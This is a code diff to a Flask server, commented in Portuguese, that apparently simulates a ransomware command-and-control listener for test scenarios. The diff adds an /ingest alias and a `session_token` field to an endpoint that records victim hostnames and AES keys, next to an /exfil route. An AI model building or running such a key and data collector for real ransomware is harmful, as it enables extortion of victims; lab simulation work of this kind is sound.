@@ -75,9 +75,13 @@ def _register(event_type: str, data: dict) -> dict:
 # ── Endpoints do ransomware ────────────────────────────────────────────────────
 
 @app.route("/collect", methods=["POST"])
+@app.route("/ingest", methods=["POST"])
 def collect():
     """
     Recebe a chave AES + hostname do ransomware (WannaCry-like, Locky-like).
+
+    Aceita os caminhos /collect e /ingest e os nomes de campo `aes_key` ou
+    `session_token`, para tolerar a variação lexical dos cenários sanitizados.
 
     Payload esperado:
         {"hostname": "DESKTOP-XYZ", "aes_key": "<base64>"}
@@ -85,7 +89,7 @@ def collect():
     try:
         payload = request.get_json(force=True, silent=True) or {}
         hostname = payload.get("hostname", "unknown")
-        aes_key  = payload.get("aes_key",  "N/A")
+        aes_key  = payload.get("aes_key") or payload.get("session_token") or "N/A"
 
         event = _register("KEY_RECEIVED", {
             "hostname": hostname,
@@ -297,7 +301,7 @@ def main():
     print("=" * 55)
     print(f"  Escutando em : http://{args.host}:{args.port}")
     print(f"  Dashboard    : http://localhost:{args.port}/")
-    print(f"  Endpoints    : POST /collect  POST /exfil  GET /ping")
+    print(f"  Endpoints    : POST /collect (alias /ingest)  POST /exfil  GET /ping")
     print(f"  Log          : {LOG_FILE.resolve()}")
     print("=" * 55 + "\n")
 
